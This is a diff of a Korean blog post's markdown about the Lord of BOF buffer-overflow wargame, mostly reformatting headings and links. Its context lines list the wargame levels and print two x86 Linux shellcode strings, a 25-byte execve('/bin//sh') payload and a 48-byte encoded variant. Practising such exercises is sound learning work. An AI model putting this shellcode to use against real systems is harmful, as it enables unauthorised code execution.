@@ -4,19 +4,18 @@ categories: [Wargame, BOF]
 tags: [BOF]
 ---
 
-## 1. bof 설정 
-<hr style="border-top: 1px solid;">
+## bof 설정 
+<hr style="border-top: 1px solid;"><br>
 
-<br>
-
-Link : <a href="https://ssaemo.tistory.com/2?category=863627" target="_blank">ssaemo.tistory.com/2?category=863627</a>
+Link 
+: <a href="https://ssaemo.tistory.com/2?category=863627" target="_blank">ssaemo.tistory.com/2?category=863627</a>
 
 <br><br>
+<hr style="border: 2px solid;">
+<br><br>
 
-## 2. 레벨 설명
-<hr style="border-top: 1px solid;">
-
-<br>
+## 레벨 설명
+<hr style="border-top: 1px solid;"><br>
 
 ```
 [레벨업 패스워드 확인]
@@ -46,11 +45,11 @@ LEVEL20 (xavis -> death_knight) : remote BOF
 ```
 
 <br><br>
+<hr style="border: 2px solid;">
+<br><br>
 
-## 3. 쉘코드
-<hr style="border-top: 1px solid;">
-
-<br>
+## shellcode
+<hr style="border-top: 1px solid;"><br>
 
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80   -->25byte
@@ -60,4 +59,11 @@ LEVEL20 (xavis -> death_knight) : remote BOF
 \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81  --> 48byte
 ```
 
+<br>
+
+shellcode 만들기
+: <a href="https://ind2x.github.io/posts/shellcode/" target="_blank">ind2x.github.io/posts/shellcode/</a>
+
+<br><br>
+<hr style="border: 2px solid;">
 <br><br>
